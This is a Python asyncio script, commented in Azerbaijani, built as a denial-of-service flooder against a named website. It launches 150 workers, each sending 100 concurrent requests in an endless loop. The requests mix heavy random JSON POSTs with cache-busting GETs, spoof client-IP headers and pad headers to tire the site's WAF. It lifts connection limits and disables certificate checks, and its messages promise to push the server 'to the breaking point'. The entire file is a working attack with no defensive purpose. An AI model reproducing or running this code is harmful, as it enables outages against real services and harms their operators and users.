import asyncio
import httpx
import random
import string
import time

# --- MAXIMUM POWER CONFIGURATION ---
TARGET_URL = "https://streamwin.win"
WORKERS = 150           # Railway RAM-ı sona qədər zorlayır
BATCH_SIZE = 100        # Hər worker eyni anda 100 "ölümcül" stream açır
DATA_LOAD = 2048        # Hər POST-da serverə göndərilən ağır yük (Kb-larla)

def r_str(n):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

async def atom_strike(worker_id, client):
    print(f"☢️  WARHEAD {worker_id} ARMED AND READY!")
    
    # Cloudflare və WAF-ı içəridən yormaq üçün "zibil" başlıqlar
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Content-Type": "application/json",
        "X-Requested-With": "XMLHttpRequest",
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache"
    }

    while True:
        try:
            # Serverin daxili axtarış motoruna (Database) və ağır API-lərinə müraciət
            # Bu müraciət serveri hər dəfə sıfırdan hesablama aparmağa məcbur edir
            url = f"{TARGET_URL}/?q={r_str(40)}&filter={r_str(60)}&id={random.getrandbits(32)}"
            
            tasks = []
            for _ in range(BATCH_SIZE):
                h = headers.copy()
                # Saxta IP spamiləri
                ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                h["X-Forwarded-For"] = ip
                h["X-Real-IP"] = ip
                
                # AĞIR POST: Serverin RAM və Database yaddaşını dərhal kilitləyir
                if _ % 2 == 0:
                    heavy_json = {r_str(10): r_str(DATA_LOAD) for _ in range(20)}
                    tasks.append(client.post(url, headers=h, json=heavy_json))
                # SÜRATLİ GET: Şəbəkə portlarını (TCP Sockets) bağlayır
                else: 
                    tasks.append(client.get(url, headers=h))

            # Bütün asinxron "başlıqları" eyni anda serverin üzərinə burax!
            await asyncio.gather(*tasks, return_exceptions=True)
            
            # NO DELAY: Serverin nəfəs almasına və bağlantıları təmizləməsinə İMKAN VERMƏ
            await asyncio.sleep(0.0001)

        except Exception:
            await asyncio.sleep(0.1)

async def main():
    print(f"💀 GLOBAL DEVASTATION MODE: {TARGET_URL}")
    print("[!] WARNING: This will saturate the target server to the breaking point.")
    
    # TCP hüdudlarını və bağlantı limitlərini tamamilə ləğv edirik
    limits = httpx.Limits(max_connections=None, max_keepalive_connections=None)
    
    async with httpx.AsyncClient(
        http2=True,          # HTTP/2 Rapid Reset effekti (MÜTLƏQDİR)
        verify=False, 
        limits=limits, 
        timeout=8.0          # Server donanda bağlantını tutub saxlamaq üçün
    ) as client:
        
        workers = [atom_strike(i, client) for i in range(WORKERS)]
        await asyncio.gather(*workers)

if __name__ == "__main__":
    asyncio.run(main())
